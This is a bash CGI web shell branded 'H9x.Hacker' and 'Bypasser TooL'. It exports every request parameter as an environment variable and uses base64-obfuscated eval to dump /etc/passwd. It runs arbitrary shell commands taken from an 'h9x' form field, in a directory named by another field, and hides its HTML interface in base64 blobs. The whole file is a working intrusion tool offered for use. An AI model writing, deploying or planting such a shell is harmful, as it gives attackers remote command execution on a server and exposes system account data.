#!/bin/bash -i

# H9x.Hacker ScRipT

# (internal) routine to store POST data
function cgi_get_POST_vars()
{
    # only handle POST requests here
    [ "$REQUEST_METHOD" != "POST" ] && return

    # save POST variables (only first time this is called)
    [ ! -z "$QUERY_STRING_POST" ] && return

    # skip empty content
    [ -z "$CONTENT_LENGTH" ] && return

    # check content type
    # FIXME: not sure if we could handle uploads with this..
    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
        echo "bash.cgi warning: you should probably use MIME type "\
             "application/x-www-form-urlencoded!" 1>&2

    # convert multipart to urlencoded
    local handlemultipart=0 # enable to handle multipart/form-data (dangerous?)
    if [ "$handlemultipart" = "1" -a "${CONTENT_TYPE:0:19}" = "multipart/form-data" ]; then
        boundary=${CONTENT_TYPE:30}
        read -N $CONTENT_LENGTH RECEIVED_POST
        # FIXME: don't use awk, handle binary data (Content-Type: application/octet-stream)
        QUERY_STRING_POST=$(echo "$RECEIVED_POST" | awk -v b=$boundary 'BEGIN { RS=b"\r\n"; FS="\r\n"; ORS="&" }
           $1 ~ /^Content-Disposition/ {gsub(/Content-Disposition: form-data; name=/, "", $1); gsub("\"", "", $1); print $1"="$3 }')

    # take input string as is
    else
        read -N $CONTENT_LENGTH QUERY_STRING_POST
    fi

    return
}

# (internal) routine to decode urlencoded strings
function cgi_decodevar()
{
    [ $# -ne 1 ] && return
    local v t h
    # replace all + with whitespace and append %%
    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
        v="${v}${t%%\%*}" # digest up to the first %
        t="${t#*%}"       # remove digested part
        # decode if there is anything to decode and if not at end of string
        if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
            h=${t:0:2} # save first two chars
            t="${t:2}" # remove these
            v="${v}"`echo -e \\\\x${h}` # convert hex to special char
        fi
    done
    # return decoded string
    echo "${v}"
    return
}

# routine to get variables from http requests
# usage: cgi_getvars method varname1 [.. varnameN]
# method is either GET or POST or BOTH
# the magic varible name ALL gets everything
function cgi_getvars()
{
    [ $# -lt 2 ] && return
    local q p k v s
    # get query
    case $1 in
        GET)
            [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
            ;;
        POST)
            cgi_get_POST_vars
            [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
            ;;
        BOTH)
            [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
            cgi_get_POST_vars
            [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
            ;;
    esac
    shift
    s=" $* "
    # parse the query data
    while [ ! -z "$q" ]; do
        p="${q%%&*}"  # get first part of query string
        k="${p%%=*}"  # get the key (variable name) from it
        v="${p#*=}"   # get the value from it
        q="${q#$p&*}" # strip first part from query string
        # decode and assign variable if requested
        [ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
            export "$k"="`cgi_decodevar \"$v\"`"
    done
    return
}

# register all GET and POST variables
cgi_getvars BOTH ALL



echo -e "Content-type: text/html\n\n"

echo 'PGh0bWw+CjxoZWFkPgo8bWV0YSBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSIKaHR0cC1lcXVpdj0iY29udGVudC10eXBlIj4KPHRpdGxlPkJ5cGFzc2VyIFRvb0w8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHN0eWxlPSJjb2xvcjogd2hpdGU7IGJhY2tncm91bmQtY29sb3I6IGJsYWNrOyIgYWxpbms9IiMwMDAwOTkiCmxpbms9IiMwMDAwOTkiIHZsaW5rPSIjOTkwMDk5Ij4KPGRpdiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyI+PGJpZwpzdHlsZT0iZm9udC1mYW1pbHk6IFRpbWVzIE5ldyBSb21hbixUaW1lcyxzZXJpZjsiPjxzcGFuCnN0eWxlPSJmb250LXdlaWdodDogYm9sZDsiPkJ5cGFzc2VyIFRvb0w8L3NwYW4+PC9iaWc+PHNwYW4Kc3R5bGU9ImZvbnQtZmFtaWx5OiBUaW1lcyBOZXcgUm9tYW4sVGltZXMsc2VyaWY7Ij4gPC9zcGFuPjxiaWcKc3R5bGU9ImZvbnQtZmFtaWx5OiBUaW1lcyBOZXcgUm9tYW4sVGltZXMsc2VyaWY7Ij48c3BhbgpzdHlsZT0iY29sb3I6IHJlZDsgZm9udC13ZWlnaHQ6IGJvbGQ7Ij48L3NwYW4+PC9iaWc+PGJyPgo8YnI+CjxkaXYgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPjxpbWcKc3R5bGU9IndpZHRoOiAxOThweDsgaGVpZ2h0OiAxODBweDsiIGFsdD0iIgpzcmM9Imh0dHBzOi8vY2RuLmF1dGgwLmNvbS9ibG9nL2xvZ29zL2JsYWNrLWhhdC1sb2dvLnBuZyI+PGJyPgo8YnI+Cjxicj4KPGJyPgo8YnI+CjwvZGl2Pgo8L2Rpdj4=' | base64 -d



echo '<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

<center>
<span style="color: red; font-weight: bold; font-family: Linux Libertine Display O;">Read:/etc/passwd</span><br>

</center>

<center>
<textarea  name="" cols="70" rows="10">'
eval `echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d`;echo '</textarea></form>
</center>
'
echo '<br>'
echo 'PGJvZHk+CjxkaXYgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsgY29sb3I6IHJlZDsiPjxzcGFuCnN0eWxlPSJmb250LXdlaWdodDogYm9sZDsgZm9udC1mYW1pbHk6IExpbnV4IEJpb2xpbnVtIE87Ij5Db21tYW5kClNoZWxsIDo8L3NwYW4+PC9kaXY+CjwvYm9keT4K'| base64 -d
echo '<br>'

if [ -n "$h9x"  ] ; then
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
cd $a
eval $h9x
echo '</xmp></div></pre></td></tr></table><br><br>'
fi
echo 'PGJyPjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCQ0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCTxkaXYgYWxpZ249ImNlbnRlciI+PHRhYmxlIGJvcmRlcj0iMCIgd2lkdGg9IjEyMCIgaWQ9InRhYmxlMSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIwIj48dHI+PHRkIHdpZHRoPSI3MTIiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJoOXgiIHNpemU9IjEwMCIgIC8+PC90ZD48dGQ+PC90ZD48L3RyPjx0cj48dGQgd2lkdGg9IjcxMiI+DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYSIgc2l6ZT0iMTAwIiB2YWx1ZT0i' | base64 -d
pwd  
echo 'Ii8+DQo8L3RkPjx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJidXR0b24xIiB2YWx1ZT0iU2VuZCIgLz48L3RkPjwvdHI+PC90YWJsZT48L2Rpdj48L2Zvcm0+PGJyPjxicj4NCjxicj48YnI+PGNlbnRlcj4NCjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCQ0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Img5eCIgdmFsdWU9IjQiICAvPg0KDQo8c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IGJvbGQ7Ij48c3Bhbg0Kc3R5bGU9ImNvbG9yOiByZ2IoMTUzLCAxNTMsIDE1Myk7Ij5IOXguSGFja2VyPC9zcGFuPiA8c3Bhbg0Kc3R5bGU9ImNvbG9yOiByZWQ7Ij58PC9zcGFuPiA8c3BhbiBzdHlsZT0iY29sb3I6IHNpbHZlcjsiPjxzcGFuDQpzdHlsZT0iY29sb3I6IHJnYigxNTMsIDE1MywgMTUzKTsiPmh4QG91dGxvb2suY2w8L3NwYW4+IDwvc3Bhbj48c3Bhbg0Kc3R5bGU9ImNvbG9yOiByZWQ7Ij58PC9zcGFuPiA8c3BhbiBzdHlsZT0iY29sb3I6IHJnYigxNTMsIDE1MywgMTUzKTsiPjIwMDktMjAxOTwvc3Bhbj48L3NwYW4+PGJyPg0KPC9kaXY+DQo8L2Rpdj4=' | base64 -d


# Don't Mess With My Tool go and create ur own


